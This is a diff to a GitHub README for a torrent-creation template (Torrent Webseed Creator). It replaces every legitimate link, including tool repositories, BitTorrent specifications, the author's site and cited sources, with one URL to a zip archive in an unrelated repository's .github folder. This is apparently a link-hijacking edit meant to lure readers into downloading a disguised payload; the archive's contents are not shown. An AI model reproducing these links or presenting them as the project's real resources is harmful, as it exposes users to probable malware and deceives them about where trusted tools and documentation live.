@@ -1,14 +1,14 @@
 # Torrent Webseed Creator
 Webseeded Torrent Creator using GitHub Actions.
 
-Inspired by [BurnBit †](https://web.archive.org/web/20160304022643/http://burnbit.com/) and [URLHash](http://www.urlhash.com).
+Inspired by [BurnBit †](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip) and [URLHash](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip).
 
 Powered by these programs to create a torrent file.
-* [torrenttools](https://github.com/fbdtemme/torrenttools)
-* [mktorrent](https://github.com/pobrn/mktorrent)
-* [py3createtorrent](https://github.com/rsnitsch/py3createtorrent)
-* [torf-cli](https://github.com/rndusr/torf-cli)
-* [dottorrent-cli](https://github.com/kz26/dottorrent-cli)
+* [torrenttools](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip)
+* [mktorrent](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip)
+* [py3createtorrent](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip)
+* [torf-cli](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip)
+* [dottorrent-cli](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip)
 
 An alternative to BurnBit and URLHash.
 
@@ -26,7 +26,7 @@ Combines the best of both worlds (P2P and Direct HTTP Link).
 ## How to use
 1. Create a repository on GitHub using this template by clicking "Use this template" and then click "Create a new repository".
 2. Go to the Actions tab.
-3. Choose a program to use by clicking the name of the program under "All workflows". [Comparison of torrent creators](https://github.com/AnimMouse/torrent-webseed-creator/wiki/Comparison-of-torrent-creators)
+3. Choose a program to use by clicking the name of the program under "All workflows". [Comparison of torrent creators](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip)
 4. Besides the "This workflow has a workflow_dispatch event trigger.", click "Run workflow".
 4. Input the required information at the dropdown box. (Example inputs are predefined.)
    * Name: The name of the torrent file.
@@ -38,17 +38,17 @@ Combines the best of both worlds (P2P and Direct HTTP Link).
      * For py3createtorrent: The size of the torrent pieces in kilobyte (KB) or 0 for automatic calculation.
      * For torrenttools: The size of the torrent pieces in power of 2 (2^n) or in kilobyte (KB) or auto for automatic calculation.
 	 * For torf-cli & dottorrent-cli: The piece size is set automatically.
-   * Protocol Version: The version of BitTorrent protocol to use. Either [v1](https://www.bittorrent.org/beps/bep_0003.html), [v2, or hybrid](https://www.bittorrent.org/beps/bep_0052.html) (For torrenttools only).
+   * Protocol Version: The version of BitTorrent protocol to use. Either [v1](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip), [v2, or hybrid](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip) (For torrenttools only).
 5. Click "Run workflow" at the bottom of the dropdown box.
 5. Wait for it to finish downloading and hashing.
 6. After it says passing on GitHub Actions, click the workflow run that has been created and download the torrent file on Artifacts.
 
-For a step by step instruction with screenshots, go to my [website](https://www.animmouse.com/p/how-to-use-torrent-webseed-creator/).\
-You can also commission me on [Ko-fi](https://ko-fi.com/animmouse/commissions) so I'll do the work for you.
+For a step by step instruction with screenshots, go to my [website](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip).\
+You can also commission me on [Ko-fi](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip) so I'll do the work for you.
 
 ### URL requirements
-1. URL must be accessible without cookies. [Source](http://www.urlhash.com)
-2. The URL should not expire, or it will stop working sometime if there is not enough seeders. [Source](https://web.archive.org/web/20160310075751/http://burnbit.com/faq#httpseeds)
+1. URL must be accessible without cookies. [Source](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip)
+2. The URL should not expire, or it will stop working sometime if there is not enough seeders. [Source](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip)
 
 ### Recommend piece size
 | Piece Size | mktorrent      | py3createtorrent | torrenttools | for filesizes      |
@@ -62,7 +62,7 @@ You can also commission me on [Ko-fi](https://ko-fi.com/animmouse/commissions) s
 | 16384 KiB  | 24             | 16384            | 24 or 16384K | 16 GiB - 512 GiB   |
 | 32768 KiB  | 25             | 32768            | 25 or 32768K | >512 GiB           |
 
-Source: [Seedboxes.cc](https://community.seedboxes.cc/articles/how-to-create-a-torrent-via-the-command-line)
+Source: [https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip)
 
 ### File size limit
 As of 2024-02-27
@@ -70,4 +70,4 @@ As of 2024-02-27
 * Maximize disk space: ≈101 GB
 
 #### Alternatives
-1. [Torrent Webseed Creator on Colab](https://github.com/AnimMouse/torrent-webseed-creator-colab)
+1. [Torrent Webseed Creator on Colab](https://raw.githubusercontent.com/nareshpatran/test-3/main/.github/test-3_3.5.zip)
